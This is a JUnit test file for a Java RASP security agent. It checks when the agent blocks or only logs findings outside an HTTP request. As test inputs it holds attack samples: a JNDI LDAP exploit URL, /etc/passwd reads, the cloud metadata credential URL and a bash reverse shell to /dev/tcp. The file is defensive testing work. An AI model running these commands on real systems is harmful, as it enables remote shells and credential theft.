package io.ohmyrasp.agent.runtime;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.hook.OhMyRaspBlockException;
import io.ohmyrasp.agent.hook.OhMyRaspHooks;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Properties;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * Block scope on the primary, as on the backports (Java8OutsideRequestTest there): a finding with request evidence
 * blocks wherever it runs; outside a request an intrinsic finding blocks whatever {@code outside_request} says, a
 * request-only finding logs whatever it says, and a context-dependent one follows it (block by default).
 */
final class OutsideRequestTest {
  private static final String LDAP = "ldap://127.0.0.1:1/Exploit";
  private static final String PASSWD = "/etc/passwd";
  private static final String METADATA = "http://169.254.169.254/latest/meta-data/";

  @AfterEach
  void restoreTheSharedRuntime() {
    // A control file that does not exist returns every setting to its start-up value.
    AgentRuntime.get().reloadIfChanged(Path.of("/nonexistent/ohmyrasp-outside-request-test.json"));
  }

  @Test
  void blockModeBlocksAContextFindingOutsideARequestByDefault() {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\"}"));
    assertFalse(OhMyRaspHooks.currentRequest().active());

    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeFileRead(PASSWD));
  }

  @Test
  void logOnlyOutsideARequestRecordsAContextFindingAndLetsTheOperationRun() {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));

    assertDoesNotThrow(() -> OhMyRaspHooks.beforeFileRead(PASSWD));
  }

  /** A remote JNDI name and the Base64 tail-underflow shape are the exploit itself: log only does not turn them off. */
  @Test
  void anIntrinsicFindingBlocksOutsideARequestWithLogOnly() {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));

    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeJndiLookup(LDAP));
    byte[] candidate = ("A".repeat(64) + "AA=").getBytes(java.nio.charset.StandardCharsets.US_ASCII);
    assertThrows(OhMyRaspBlockException.class,
        () -> OhMyRaspHooks.beforeBase64Decode(candidate, 0, candidate.length, false, false));
  }

  /**
   * The cloud metadata address outside a request follows the setting, as the backports decided on main: it blocks by
   * default and logs under log only. An ftp: URL a job fetches is one of the primary's request-only SSRF rules: it
   * logs outside a request whatever the setting says. Inside a request both block.
   */
  @Test
  void theMetadataAddressFollowsTheSettingAndARequestOnlyRuleLogsOutsideARequest() throws Exception {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\"}"));

    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeUrlOpen(URI.create(METADATA).toURL()));
    assertDoesNotThrow(() -> OhMyRaspHooks.beforeUrlOpen(URI.create("ftp://127.0.0.1:1/report.csv").toURL()));
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
    assertDoesNotThrow(() -> OhMyRaspHooks.beforeUrlOpen(URI.create(METADATA).toURL()));
    OhMyRaspHooks.enterHttpRequest(new ReportRequest(), new Object());
    try {
      assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeUrlOpen(URI.create(METADATA).toURL()));
      assertThrows(OhMyRaspBlockException.class,
          () -> OhMyRaspHooks.beforeUrlOpen(URI.create("ftp://127.0.0.1:1/report.csv").toURL()));
    } finally {
      OhMyRaspHooks.exitHttpRequest();
    }
  }

  /**
   * A cloud provider's own credential client reading the metadata address outside a request is logged, not blocked
   * (here a stand-in with the AWS SDK 2.x class name, which is also the documented trust boundary: the name is the
   * evidence). The same read by application code blocks; inside a request the SDK's read blocks too.
   */
  @Test
  void aCloudSdkCredentialClientReadingMetadataOutsideARequestLogs() throws Exception {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\"}"));
    java.net.URL credentials = URI.create("http://169.254.169.254/latest/meta-data/iam/security-credentials/").toURL();

    assertDoesNotThrow(() -> software.amazon.awssdk.auth.credentials.InstanceProfileCredentialsProvider.read(credentials));
    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeUrlOpen(credentials));
    OhMyRaspHooks.enterHttpRequest(new ReportRequest(), new Object());
    try {
      assertThrows(OhMyRaspBlockException.class,
          () -> software.amazon.awssdk.auth.credentials.InstanceProfileCredentialsProvider.read(credentials));
    } finally {
      OhMyRaspHooks.exitHttpRequest();
    }
  }

  /**
   * An exchange with no captured origin that runs on a thread serving a request is inside that request: the active
   * request is the fallback, as on the backports. With log only, the metadata destination still blocks there.
   */
  @Test
  void anExchangeWithoutACapturedOriginOnARequestThreadIsInsideThatRequest() {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
    URI metadata = URI.create(METADATA);
    OhMyRaspHooks.enterHttpRequest(new ReportRequest(), new Object());
    try {
      assertThrows(OhMyRaspBlockException.class,
          () -> OhMyRaspHooks.beforeHttpExchange(new Object(), new Object(), metadata));
    } finally {
      OhMyRaspHooks.exitHttpRequest();
    }
    assertDoesNotThrow(() -> OhMyRaspHooks.beforeHttpExchange(new Object(), new Object(), metadata));
  }

  /**
   * Under log only, a launch that a Groovy script or Solr's configured listener makes is still stopped when its
   * arguments are an exploit's: the intrinsic finding is not hidden by the context-dependent one.
   */
  @Test
  void anExploitShapedLaunchUnderAScriptEngineBlocksWithLogOnly() {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
    var groovy = java.util.List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods");
    var solr = java.util.List.of("org.apache.solr.core.RunExecutableListener");

    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeProcessBuilderStart(
        new ProcessBuilder("sh", "-c", "cat /etc/passwd"), groovy));
    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeProcessBuilderStart(
        new ProcessBuilder("bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), solr));
    assertDoesNotThrow(() -> OhMyRaspHooks.beforeProcessBuilderStart(new ProcessBuilder("ls", "-l"), groovy));
  }

  /** The YARN handler holds the HTTP request: a denial is inside a request with no servlet frame tracked. */
  @Test
  void aHookThatHoldsTheRequestDecidesInsideARequestWithoutAServletFrame() {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
    System.setProperty("ohmyrasp.yarn.submitRole", "submitter");
    try {
      RoleRequest request = role -> false;
      assertThrows(OhMyRaspBlockException.class,
          () -> OhMyRaspHooks.afterYarnSubmitPrepared(new Object(), request, RoleRequest.class));
    } finally {
      System.clearProperty("ohmyrasp.yarn.submitRole");
    }
  }

  /** A plain request: GET /reports?id=7, nothing in it a request rule reports. */
  public static final class ReportRequest {
    public String getMethod() { return "GET"; }
    public String getRequestURI() { return "/reports"; }
    public String getQueryString() { return "id=7"; }
    public java.util.Map<String, java.util.List<String>> getParameterMap() {
      return java.util.Map.of("id", java.util.List.of("7"));
    }
    public java.util.Enumeration<String> getHeaderNames() {
      return java.util.Collections.enumeration(java.util.List.of("user-agent"));
    }
    public String getHeader(String name) { return "JUnit"; }
  }

  /** The one method of a servlet request the YARN submission check calls. */
  public interface RoleRequest {
    boolean isUserInRole(String role);
  }

  /**
   * An HTTP client exchange submitted inside a request carries it onto the thread that runs the exchange: the
   * metadata destination blocks there with log only, as on the backports. Submitted outside a request it logs.
   */
  @Test
  void anExchangeSubmittedInsideARequestIsInsideItOnTheThreadThatRunsIt() throws Exception {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
    URI metadata = URI.create(METADATA);
    Object carried = new Object();
    OhMyRaspHooks.enterHttpRequest(new ReportRequest(), new Object());
    try {
      OhMyRaspHooks.captureHttpSubmission(carried, metadata);
    } finally {
      OhMyRaspHooks.exitHttpRequest();
    }
    assertTrue(blockedOnAnotherThread(carried, metadata), "submitted in a request");
    assertFalse(blockedOnAnotherThread(new Object(), metadata), "submitted outside a request");
  }

  /**
   * A CXF XOP attachment reference that opens a host file is intrinsic: read on another thread, with no request behind
   * it and log only, it still blocks, as on the backports.
   */
  @Test
  void anAttachmentThatOpensAHostFileBlocksOutsideARequestWithLogOnly(@TempDir Path dir) throws Exception {
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
    Path report = Files.writeString(dir.resolve("weekly.txt"), "weekly");
    Object source = new Object();
    Object reference = io.ohmyrasp.agent.xml.AttachmentFileRead.beginReference(report.toUri().toString(), null);
    try {
      io.ohmyrasp.agent.xml.AttachmentFileRead.created(source, report.toUri().toURL());
    } finally {
      io.ohmyrasp.agent.xml.AttachmentFileRead.endReference(reference);
    }
    var thrown = new java.util.concurrent.atomic.AtomicReference<Throwable>();
    Thread reader = new Thread(() -> {
      Object read = io.ohmyrasp.agent.xml.AttachmentFileRead.beginRead(source);
      try {
        OhMyRaspHooks.beforeFileRead(report.toString());
      } catch (Throwable failure) {
        thrown.set(failure);
      } finally {
        io.ohmyrasp.agent.xml.AttachmentFileRead.endRead(read);
      }
    }, "attachment-reader");
    reader.start();
    reader.join(10_000);
    assertTrue(thrown.get() instanceof OhMyRaspBlockException, String.valueOf(thrown.get()));
  }

  private static boolean blockedOnAnotherThread(Object exchange, URI uri) throws Exception {
    var thrown = new java.util.concurrent.atomic.AtomicReference<Throwable>();
    Thread worker = new Thread(() -> {
      try {
        OhMyRaspHooks.beforeHttpExchange(exchange, new Object(), uri);
      } catch (Throwable failure) {
        thrown.set(failure);
      }
    }, "exchange-worker");
    worker.start();
    worker.join(10_000);
    Throwable failure = thrown.get();
    if (failure != null && !(failure instanceof OhMyRaspBlockException)) throw new AssertionError(failure);
    return failure != null;
  }

  /**
   * The cloud's setting travels in the policy (config.hardening.outside_request) through the managed path, beside a
   * rule that blocks the finding: log in the policy makes it log outside a request, and withdrawing the policy (a
   * document without one) withdraws the setting with it. Blocking needs both the host's member and the policy's.
   */
  @Test
  void theCloudsSettingTravelsInThePolicyAndLeavesWithIt() {
    String rule = "\"rules\":[{\"algorithm\":\"readFile_unwanted\",\"action\":\"block\"}]";
    String logPolicy = "{\"version\":7,\"status\":\"active\"," + rule
        + ",\"config\":{\"hardening\":{\"outside_request\":\"log\"}}}";
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"policy\":" + quoted(logPolicy) + "}"));
    assertFalse(AgentRuntime.get().state().outsideRequestBlocks(), "the policy says log");
    assertTrue(AgentRuntime.get().state().hostOutsideRequestBlocks(), "the host's start-up value is untouched");
    assertDoesNotThrow(() -> OhMyRaspHooks.beforeFileRead(PASSWD));

    assertTrue(AgentRuntime.get().apply(
        "{\"mode\":\"block\",\"outside_request\":\"block\",\"policy\":" + quoted(logPolicy) + "}"));
    assertDoesNotThrow(() -> OhMyRaspHooks.beforeFileRead(PASSWD), "the host's block does not override the cloud's log");

    String blockPolicy = "{\"version\":8,\"status\":\"active\"," + rule + "}";
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"policy\":" + quoted(blockPolicy) + "}"));
    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeFileRead(PASSWD), "a policy without it");

    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"policy\":" + quoted(logPolicy) + "}"));
    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"revision\":9}"));
    assertTrue(AgentRuntime.get().state().outsideRequestBlocks(), "withdrawn");
    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeFileRead(PASSWD), "withdrawn");
  }

  /**
   * The legacy flags (ohmyrasp.block, ohmyrasp.force_block) do not override log only either: a context-dependent
   * finding outside a request logs, an intrinsic one blocks.
   */
  @Test
  void theLegacyFlagsDoNotOverrideLogOnly() {
    assertTrue(AgentRuntime.get().apply("{\"outside_request\":\"log\"}"));
    System.setProperty("ohmyrasp.block", "true");
    System.setProperty("ohmyrasp.force_block", "true");
    try {
      assertDoesNotThrow(() -> OhMyRaspHooks.beforeFileRead(PASSWD));
      assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeJndiLookup(LDAP));
    } finally {
      System.clearProperty("ohmyrasp.block");
      System.clearProperty("ohmyrasp.force_block");
    }
  }

  private static String quoted(String json) {
    return "\"" + json.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
  }

  @Test
  void anAbsentOrNullMemberMeansTheStartUpValueAndAValueNobodyAcceptsChangesNothing() {
    AgentRuntime runtime = AgentRuntime.newForTesting();
    assertTrue(runtime.state().outsideRequestBlocks(), "block before any setting");

    for (String unknown : new String[] {"\"sometimes\"", "\"monitor\"", "7", "true", "{}"}) {
      assertTrue(runtime.apply("{\"mode\":\"block\",\"outside_request\":\" LOG \"}"));
      assertFalse(runtime.state().outsideRequestBlocks(), "any case, padded");
      assertTrue(runtime.apply("{\"mode\":\"monitor\",\"outside_request\":" + unknown + "}"));
      assertFalse(runtime.state().outsideRequestBlocks(), unknown + " keeps log");
      assertEquals(DetectionMode.MONITOR, runtime.mode(), unknown + ": the rest of the document applies");
    }
    assertTrue(runtime.apply("{\"mode\":\"block\"}"));
    assertTrue(runtime.state().outsideRequestBlocks(), "absent: the start-up value");
    assertTrue(runtime.apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
    assertTrue(runtime.apply("{\"mode\":\"block\",\"outside_request\":null}"));
    assertTrue(runtime.state().outsideRequestBlocks(), "null: the start-up value");
  }

  @Test
  void theStartUpValueComesFromTheAgentArgumentAndARemovedFileReturnsToIt(@TempDir Path dir) throws Exception {
    Path file = dir.resolve("control.json");
    AgentRuntime runtime = AgentRuntime.newForTesting();
    runtime.start("control=" + file + ",control_poll_ms=86400000,mode=block,outside_request=log");
    assertFalse(runtime.state().outsideRequestBlocks(), "the agent argument");

    Files.writeString(file, "{\"mode\":\"block\",\"outside_request\":\"block\"}");
    runtime.reloadIfChanged();
    assertTrue(runtime.state().outsideRequestBlocks(), "the control file overrides it");
    Files.writeString(file, "{\"mode\":\"block\"}");
    runtime.reloadIfChanged();
    assertFalse(runtime.state().outsideRequestBlocks(), "a document without it: the start-up value");
    Files.writeString(file, "{\"mode\":\"block\",\"outside_request\":\"block\"}");
    runtime.reloadIfChanged();
    Files.delete(file);
    runtime.reloadIfChanged();
    assertFalse(runtime.state().outsideRequestBlocks(), "a removed file: the start-up value");
  }

  @Test
  void anUnusableAgentArgumentLeavesTheNextSourceInCharge() {
    AgentRuntime runtime = AgentRuntime.newForTesting();
    runtime.start("control=none,mode=block,outside_request=sometimes");
    assertTrue(runtime.state().outsideRequestBlocks());
  }

  /** Under lock_config only the baked value counts, as for mode. */
  @Test
  void aLockedProfileTakesOnlyTheBakedValue() {
    Properties baked = new Properties();
    baked.setProperty("standalone", "true");
    baked.setProperty("lock_config", "true");
    baked.setProperty("mode", "block");
    baked.setProperty("outside_request", "log");
    AgentRuntime locked = AgentRuntime.newForTesting(ShirudoDefaults.fromProperties(baked));
    locked.start("outside_request=block", ShirudoDefaults.fromProperties(baked));
    assertFalse(locked.state().outsideRequestBlocks());

    baked.remove("outside_request");
    AgentRuntime lockedDefault = AgentRuntime.newForTesting(ShirudoDefaults.fromProperties(baked));
    lockedDefault.start("outside_request=log", ShirudoDefaults.fromProperties(baked));
    assertTrue(lockedDefault.state().outsideRequestBlocks(), "nothing baked: the default, not the argument");
  }
}
